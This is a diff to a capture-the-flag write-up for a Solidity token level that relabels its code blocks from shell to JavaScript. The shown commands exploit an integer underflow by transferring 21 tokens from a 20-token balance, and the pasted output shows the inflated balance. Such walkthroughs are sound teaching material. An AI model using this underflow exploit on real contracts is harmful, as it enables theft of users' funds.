@@ -35,7 +35,7 @@ You are given 20 tokens to start with and you will beat the level if you somehow
 
 Check our balance.
 
-```shell
+```js
 await contract.balanceOf('0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b')
 o {negative: 0, words: Array(2), length: 1, red: null}
 length
@@ -69,11 +69,11 @@ More about [overflow and underflow vulnerability in solidity.](https://hackernoo
 
 The only thing that will solve this challenge is to send value to an address greater than 20 to the **_value** variable and transfer an address which is not ours.
 
-```shell
+```js
 await contract.transfer( "0x1824d95Fc8b6fFF19867D09654bCF1369AeD4C21", 20 + 1)
 ```
 
-```shell
+```js
 await contract.balanceOf('0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b')
 o {negative: 0, words: Array(11), length: 10, red: null}length: 10negative: 0red: nullwords: (11) [67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 4194303, boş][[Prototype]]: Object
 ```
